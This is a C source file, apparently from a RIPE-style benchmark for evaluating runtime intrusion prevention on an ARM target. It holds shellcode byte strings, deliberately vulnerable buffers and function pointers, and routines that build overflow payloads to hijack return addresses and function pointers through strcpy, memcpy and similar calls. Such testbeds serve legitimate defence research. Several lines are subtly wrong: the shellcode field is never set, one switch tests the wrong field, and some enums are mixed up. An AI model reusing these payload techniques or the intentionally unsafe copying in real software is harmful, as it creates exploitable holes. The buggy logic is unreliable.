
#include <stdio.h>
#include <string.h>

#include "ripe.h"

// -------------------------------------------------------
// SHELLCODES
// -------------------------------------------------------

char shellcode_nonop[] =
    "\xff\xdf\xff\xdf\xff\xdf";

char shellcode_nop[] =
    "\x01\x01\x81\xea\xff\xdf";

// -------------------------------------------------------
// VULNERABLE STRUCT / FUNCTIONS / BUFFERS (BSS SEGMENT)
// -------------------------------------------------------

vulnerable_function_t vulnerable_function_bss;

vulnerable_struct_t vulnerable_struct_bss;

// -------------------------------------------------------
// VULNERABLE STRUCT / FUNCTIONS / BUFFERS (DATA SEGMENT)
// -------------------------------------------------------

vulnerable_function_t vulnerable_function_data = dummy_fun;

vulnerable_struct_t vulnerable_struct_data = DUMMY_STRUCT;

// -------------------------------------------------------
// VULNERABLE STRUCT / FUNCTIONS / BUFFERS (STACK SEGMENT)
// -------------------------------------------------------

// Directly in the function

// -------------------------------------------------------
// PAYLOADS
// -------------------------------------------------------

struct payload_ret_t payload_ret;
struct payload_struct_t payload_struct;
struct payload_fun_t payload_fun;

// -------------------------------------------------------
// GETTER
// -------------------------------------------------------

int get_payload_len(struct param_t *attack_params)
{
    switch (attack_params->location)
    {
    case STACK:
        return sizeof(struct payload_ret_t);
    case STRUCT:
        return sizeof(struct payload_struct_t);
    case FUNCTION_POINTER:
        return sizeof(struct payload_fun_t);
    default:
        break;
    }

    return 0;
}

// -------------------------------------------------------
// ATTACK DOMAIN SPACE EXPLORATION
// -------------------------------------------------------

/**
 * @brief Given a progressive integer number, sets the parameters structure
 *
 * As an example, passing n as attack number, it sets:
 * - 0 -> NONOP, STACK, RETURN_ADDRESS, MEMCPY
 * - 1 -> NOP, STACK, RETURN_ADDRESS, MEMCPY
 * - 2 -> NONOP, BSS, RETURN_ADDRESS, MEMCPY
 * ...
 *
 * @param number The attack progressive number
 * @param attack_params The structure hosting the attack params
 */

void number_to_attack_params(int number, struct param_t *attack_params)
{
    attack_params->shellcode = number % SHELLCODE_NUM;
    number -= attack_params->shellcode;

    if (number <= 0)
    {
        attack_params->location = 0;
        attack_params->pointer = 0;
        attack_params->function = 0;
        return;
    }

    attack_params->location = number % LOCATION_NUM;
    number -= attack_params->location;

    if (number <= 0)
    {
        attack_params->pointer = 0;
        attack_params->function = 0;
        return;
    }

    attack_params->pointer = number % POINTER_NUM;
    number -= attack_params->pointer;

    if (number <= 0)
    {
        attack_params->function = 0;
        return;
    }

    attack_params->function = number % FUNCTION_NUM;
}

/**
 * @brief Exclude non-possible attacks due to conflicting option
 *
 * @param attack_params The structure hosting the attack params
 */

bool attack_possible(struct param_t *attak_params)
{
    if (attak_params->pointer == RETURN_ADDRESS)
    {
        if (attak_params->location != STACK)
            return false;
        else
            return true;
    }

    return true;
}

// -------------------------------------------------------
// VULNERABLE FUNCTIONS / TYPEDEFS / DUMMY DATA
// -------------------------------------------------------

/**
 * @brief A loop-based equivalent of memcpy
 */
void homebrew(char *dest, char *src, unsigned int len)
{
    for (unsigned int i = 0; i < len; i++)
        dest[i] = src[i];
}

/**
 * @brief Just a placeholder function
 *
 * Needed to initialize variables (and let them be placed in .data)
 *
 */
void dummy_fun()
{
    ;
}

/**
 * @brief A function that contains a sensitive instruction
 *
 * The hijacked pointer to function calls this function or part of it
 *
 */
void fake_fun()
{
    int var;
    int count;

    var = 10;
    count = 0;

    for (int i = 0; i < var; i++)
        count++;

    asm("svc 255");
}

/**
 * @brief Fill the provided buffer 'buffer' using DUMMY_CHAR for 'n' bytes
 *
 * @param buffer The buffer to be filled
 * @param n The number of bytes written
 */
void fill_padding(char *buffer, int n)
{
    for (int i = 0; i < n; i++)
        buffer[i] = DUMMY_CHAR;
}

// -------------------------------------------------------
// PROGRAM
// -------------------------------------------------------

void build_payload(struct param_t *attack_params, char *payload, int *target_location)
{
    // PADDING

    if (attack_params->location == STACK)
    {
        fill_padding(payload_ret.padding, PADDING_LEN);
    }

    // SHELLCODE

    switch (attack_params->shellcode)
    {
    case NONOP:
        if (attack_params->pointer != FUNCTION_POINTER)
            homebrew(payload, shellcode_nonop, SHELLCODE_LEN); // is copying into the shellcode
        break;
    case NOP:
        if (attack_params->pointer != FUNCTION_POINTER)
            homebrew(payload, shellcode_nop, SHELLCODE_LEN); // is copying into the shellcode
        break;
    default:
        break;
    }

    // ADDRESS
    int *payload_address;

    switch (attack_params->location)
    {
    case FUNCTION_POINTER:
        payload_address = (int *)payload;
        *payload_address = (int)(fake_fun + FAKE_FUN_SVC_OFFSET + 1);
        break;
    case STACK:
        payload_address = (int *)(payload + SHELLCODE_LEN + PADDING_LEN);
        *payload_address = (int)target_location + 1;
        // homebrew(payload + SHELLCODE_LEN + PADDING_LEN, &target_location, sizeof(char *));
        break;
    case STRUCT:
        payload_address = (int *)(payload + SHELLCODE_LEN);
        *payload_address = (int)target_location + 1;
        break;
    default:
        break;
    }
}

void attack(struct param_t *attack_params)
{
    // -------------------------------------------------------
    // VULNERABLE STRUCT / FUNCTIONS / BUFFERS (STACK SEGMENT)
    // -------------------------------------------------------

    vulnerable_buffer_t vulnerable_buffer_stack = DUMMY_BUFF;
    vulnerable_function_t vulnerable_function_pointer_stack = dummy_fun;
    vulnerable_struct_t vulnerable_struct_stack = DUMMY_STRUCT;

    char *target_location;
    char *target_payload;

    // LOCATION

    switch (attack_params->location)
    {
    case STACK:
        if (attack_params->pointer == RETURN_ADDRESS)
        {
            target_location = vulnerable_buffer_stack;
            target_payload = (char *)&payload_ret;
        }
        if (attack_params->pointer == STRUCT)
        {
            target_location = (char *)&vulnerable_struct_stack;
            target_payload = (char *)&payload_struct;
        }
        if (attack_params->pointer == FUNCTION_POINTER)
        {
            target_location = (char *)&vulnerable_function_pointer_stack;
            target_payload = (char *)&payload_fun;
        }
        break;
    case BSS:
        if (attack_params->pointer == STRUCT)
        {
            target_location = (char *)&vulnerable_struct_bss;
            target_payload = (char *)&payload_struct;
        }
        if (attack_params->pointer == FUNCTION_POINTER)
        {
            target_location = (char *)&vulnerable_function_bss;
            target_payload = (char *)&payload_fun;
        }
        break;
    case DATA:
        if (attack_params->pointer == STRUCT)
        {
            target_location = (char *)&vulnerable_struct_data;
            target_payload = (char *)&payload_struct;
        }
        if (attack_params->pointer == FUNCTION_POINTER)
        {
            target_location = (char *)&vulnerable_function_data;
            target_payload = (char *)&payload_fun;
        }
        break;
    default:
        break;
    }

    build_payload(attack_params, target_payload, (int *)target_location);

    // FUNCTION ABUSED

    switch (attack_params->function)
    {
    case STRCPY:
        strcpy(target_location, (char *)target_payload);
        break;
    case STRNCPY:
        strncpy(target_location, (char *)target_payload, get_payload_len(attack_params));
        break;
    case MEMCPY:
        memcpy(target_location, (char *)target_payload, get_payload_len(attack_params));
        break;
    case MEMMOVE:
        memmove(target_location, (char *)target_payload, get_payload_len(attack_params));
        break;
    case HOMEBREW:
        homebrew(target_location, (char *)target_payload, get_payload_len(attack_params));
        break;
    default:
        break;
    }

    // TARGET CODE POINTER

    switch (attack_params->function)
    {
    case RETURN_ADDRESS:
        return;
    case STRUCT:
        ((vulnerable_struct_t *)target_location)->fun_point();
        break;
    case FUNCTION_POINTER:
        ((vulnerable_function_t)target_location)();
        break;
    default:
        break;
    }
}

#ifdef TEST_RIPE
int main(int argc, char *argv[])
{
    struct param_t attack_params;

    if (argc < 2)
    {
        printf("You have to specify attack number.\n");
        return 1;
    }

    attack_params.function = NONOP;
    attack_params.function = HOMEBREW;
    attack_params.location = STACK;
    attack_params.pointer = RETURN_ADDRESS;
    // number_to_attack_params(atoi(argv[1]), &attack_params);

    // if the attack is not possible, do a reset?
    if (!attack_possible(&attack_params))
        return 1; // maybe reset

    attack(&attack_params);

    // if the code reaches this point, the attack is failed
    printf("NO");

    return 0;
}
#endif